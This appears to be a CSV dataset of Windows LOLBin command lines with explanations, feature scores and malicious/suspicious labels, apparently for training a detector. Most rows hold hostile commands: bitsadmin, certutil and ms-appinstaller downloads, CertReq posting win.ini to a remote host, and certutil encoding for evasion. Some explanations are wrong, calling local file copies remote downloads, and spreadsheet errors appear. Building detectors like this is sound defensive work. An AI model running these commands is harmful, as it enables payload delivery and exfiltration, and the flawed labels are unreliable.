prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,"This command could potentially download and execute a malicious application from a remote source, allowing an attacker to gain access to the victim's machine.",ms-appinstaller,https://pastebin.com/raw/tdyShwLw,none,source=https://pastebin.com/raw/tdyShwLw,none,start,none,0.65,malicious
start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw,"This command can be used to initiate the installation of an application from a remote source, potentially allowing an attacker to install malicious software on the victim's machine.",ms-appinstaller,https://10.101.10.10/raw/tdyShwLw,none,source=https://10.101.10.10/raw/tdyShwLw,10.101.10.10,start,none,0.75,malicious
start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw,"This command could be used to initiate the installation of a potentially malicious application from a remote server, which could then be used to gain unauthorized access or steal sensitive information from the compromised machine.",ms-appinstaller,https://11.101.10.10/raw/tdyShwLw,none,source=https://11.101.10.10/raw/tdyShwLw,11.101.10.10,start,none,0.75,malicious
C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,"This command schedules a task to run every day at 9:00 AM with interactive privileges, which could potentially be used to execute malicious code or commands at a specific time without being detected.",at.exe,C:\\Windows\\System32\\at.exe,none,C:\\Windows\\System32\\at.exe,none,"at 09:00,/interactive,/every:m",none,0.65,malicious
ATBroker.exe /start malware,"Potential use: Launches malware through the ATBroker.exe process.
What it does: Executes the specified malware payload through the ATBroker.exe process, which is a legitimate Windows accessibility tool, allowing the attacker to evade detection.",ATBroker.exe,malware,none,malware,none,/start,none,0.65,malicious
bash.exe -c calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the Bash shell, potentially allowing an attacker to bypass security measures that block direct execution of calc.exe.",bash.exe,calc.exe,none,none,none,-c,none,0.55,suspicious
bash.exe -c calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the Bash shell, potentially allowing an attacker to bypass security measures that block direct execution of calc.exe.",bash.exe,calc.exe,none,none,none,-c,none,0.55,suspicious
bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"This command can be used to create a BITS job that downloads and executes a command shell from a remote server, allowing an attacker to execute arbitrary commands on the compromised machine.",bitsadmin,c:\\data\\playfolder\\1.txt:cmd.exe,bitsadmin,c:\\windows\\system32\\cmd.exe,none,"/create 1,/addfile 1,/RESUME 1,/complete 1",none,0.85,malicious
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,This command can be used to download and execute a malicious file from a remote server using the built-in Windows Background Intelligent Transfer Service (BITS).,bitsadmin,c:\\data\\playfolder\\autoruns.exe,bitsadmin,https://live.sysinternals.com/autoruns.exe ,none,"/create 1,/addfile 1,/RESUME 1,/complete 1",none,0.85,malicious
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"This command can be used to create a BITS job that downloads and executes a malicious file (cmd.exe) from a remote server, and then resets the BITS job to cover tracks.",bitsadmin,c:\\data\\playfolder\\cmd.exe,bitsadmin,c:\\windows\\system32\\cmd.exe,none,"/create 1,/addfile 1,/RESUME 1,/complete 1,/reset",none,0.85,malicious
bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,"This command can be used to download and execute a malicious file (cmd.exe) from a remote server using the Background Intelligent Transfer Service (BITS) and set it to run automatically upon completion, while also hiding the execution from the user.",bitsadmin,c:\\data\\playfolder\\cmd.exe,bitsadmin,c:\\windows\\system32\\cmd.exe,none,"/create 1,/addfile 1,/SetNotifyCmdLine 1,/RESUME 1,/complete 1,/reset",none,0.85,malicious
CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt,This command can be used to request a certificate from a remote server and potentially exfiltrate sensitive information from the win.ini file on the victim's machine.,CertReq,c:\\windows\\win.ini,none,https://example.org/,none,"-Post,-config,output.txt",none,0.65,malicious
CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal,"This command could potentially be used to exfiltrate sensitive information from the target machine by requesting a certificate from a remote server and posting the contents of the win.ini file to it, with the response being displayed in the terminal.",CertReq,c:\\windows\\win.ini,none,https://example.org/,none,"-Post,-config,show response in terminal",none,0.65,malicious
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"This command downloads and caches a file from a specified URL, potentially allowing an attacker to download and execute malicious code on a victim's machine.",certutil.exe,http://7-zip.org/a/7z1604-x64.exe ,none,http://7-zip.org/a/7z1604-x64.exe ,none,"-urlcache,-split,-f",none,0.65,malicious
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt,"This command downloads a PowerShell script from a remote server and saves it to the local machine, potentially allowing an attacker to execute malicious code.",certutil.exe,c:\\temp:ttt ,none,https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 ,none,"-urlcache,-split,-f",none,0.65,malicious
certutil -encode inputFileName encodedOutputFileName,This command can be used to encode a file and potentially hide it from detection by antivirus software or other security measures on a Windows machine.,certutil,encodedOutputFileName,none,inputFileName,none,#NAME?,none,0.65,malicious
certutil -decode encodedInputFileName decodedOutputFileName,"This command can be used to decode a file that has been encoded, potentially to hide malicious content, and save the decoded file to a new location.",certutil,decodedOutputFileName ,none,encodedInputFileName,none,#NAME?,none,0.65,malicious
